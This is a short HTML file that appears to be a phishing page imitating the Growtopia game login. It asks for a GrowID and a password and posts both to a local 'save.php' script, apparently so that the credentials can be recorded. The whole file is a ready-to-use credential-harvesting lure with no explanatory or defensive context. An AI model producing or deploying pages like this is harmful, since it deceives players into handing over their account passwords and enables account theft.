
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Growtopia Login</title>
    <link rel="stylesheet" href="style.css">
    <link rel="icon" href="favicon.ico" type="image/x-icon">
</head>
<body>
    <div class="login-container">
        <img src="growtopia.png" alt="Growtopia" class="logo">
        <h2>Growtopia Login</h2>
        <form action="save.php" method="POST">
            <input type="text" name="username" placeholder="GrowID" required><br>
            <input type="password" name="password" placeholder="Password" required><br>
            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>
